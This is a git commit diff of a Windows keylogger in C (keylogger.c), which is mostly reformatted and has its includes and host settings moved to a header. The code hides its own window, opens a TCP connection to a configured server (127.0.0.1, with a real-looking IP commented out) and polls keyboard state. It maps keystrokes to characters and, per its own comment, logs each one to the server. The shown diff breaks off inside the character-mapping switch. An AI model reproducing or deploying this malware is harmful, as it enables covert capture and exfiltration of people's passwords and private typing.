39d4157d56d638d5b9770a70e2cbdbed45c15ed3
unknown <amirsil2002@gmail.com>
2020-08-14 17:49:54 +0300

    Updated branch

--- keylogger.c
+++ keylogger.c
@@ -1,35 +1,20 @@
-#define _WIN32_WINNT 0x0501
-#include <windows.h>
-#include <stdio.h>
-#include <winuser.h>
-#include <winsock.h>  
-#include <conio.h>
-#include <winsock2.h>
-#pragma comment(lichr, "ws2_32.lichr")
-#define PORT 42069
-#define HOST "127.0.0.1" 
-//"128.61.240.205"
-
+#include "keylogger.h"
+/*	
+	Hides the process's window on execution	
+*/
 BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
 {
-	/*
-
-		Hides the process's window on execution
-
-	*/
-
+	
     DWORD pid;
     GetWindowThreadProcessId(hwnd, &pid);
-    if (pid == GetCurrentProcessId()) 
-        {
+    if (pid == GetCurrentProcessId()) {
             ShowWindow(hwnd, SW_HIDE);
             return FALSE;
         }
     return TRUE;
 }
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
-    LPSTR lpCmdLine, int nCmdShow)
-{
+    LPSTR lpCmdLine, int nCmdShow) {
     WSADATA wsa;
     SOCKET s;
     INPUT Event;
@@ -38,20 +23,15 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     char chr;
     struct sockaddr_in server;
 
-    /*
-	
-		Connects to the server
-
+    /*	
+    	Connects to the server
     */
-
-    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
-    {   
+    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {   
         printf("Failed. Error Code : %d",WSAGetLastError());
         return 2;  
     }
     s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (s == INVALID_SOCKET)
-    {
+    if (s == INVALID_SOCKET) {
         printf("Failed. Error Code : %d",WSAGetLastError());
         WSACleanup();
         return 2;
@@ -60,40 +40,33 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     server.sin_addr.s_addr = inet_addr(HOST);
     server.sin_family = AF_INET;
     server.sin_port = htons(PORT);
-    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
-    {   
+    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0) {   
         printf("Failed. Error Code : %d", WSAGetLastError());
         WSACleanup(); 
         closesocket(s);
         return 2;
     }
     /*
-
-		Logs every relevant keystroke and logs it to the server
-
+    	Logs every relevant keystroke and logs it to the server
     */
     while (TRUE)
         for ( int i = 0x00 ; i<0xfe ; ++i )
-            if ( GetKeyState(i) < 0 )
-            {
+            if ( GetKeyState(i) < 0 ) {
                 Event.type = INPUT_KEYBOARD;
                 Event.ki.dwFlags = KEYEVENTF_SCANCODE | KEYEVENTF_KEYUP;
                 Event.ki.wScan = MapVirtualKey(i, 0);
                 if ((i >= '0' && i <= '9') || 
-                    (i >= 'A' && i <= 'Z') || 
-                    (i >= VK_OEM_1 && i <= VK_OEM_8) || 
-                    i == VK_SPACE || i == VK_BACK ||
-                     i == VK_RETURN || i == VK_TAB)
-                {
+                (i >= 'A' && i <= 'Z') || 
+                (i >= VK_OEM_1 && i <= VK_OEM_8) || 
+                i == VK_SPACE || i == VK_BACK ||
+                i == VK_RETURN || i == VK_TAB) {
                     SendInput(1, &Event, sizeof(Event));
                     if ((i >= '0' && i <= '9') || (i >= 'A' && i <= 'Z')) chr = (char)i;                      
                     if ( i == VK_RETURN) chr = '\n';
                     if ( i == VK_BACK || i == VK_SPACE || i == VK_TAB ) chr = ' ';
                     else if ((i >= 'A' && i <= 'Z') && GetKeyState(VK_SHIFT) >= 0) chr = (char)(i+32);
-                    else if (GetKeyState(VK_SHIFT) < 0)
-                    {
-                        switch (i)
-                        {
+                    else if (GetKeyState(VK_SHIFT) < 0) {
+                        switch (i) {
                         	case '0' : chr = ')'; break;
 	                        case '1' : chr = '!'; break;
 	                        case '2' : chr = '@'; break;
@@ -119,8 +92,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                         
                     }
                     else
-	                    switch (i)
-	                    {
+	                    switch (i){
 	                    	case VK_OEM_1 : chr = ';'; break;
 		                    case VK_OEM_PLUS : chr = '='; break;
 		                    case VK_OEM_COMMA : chr = ','; break;
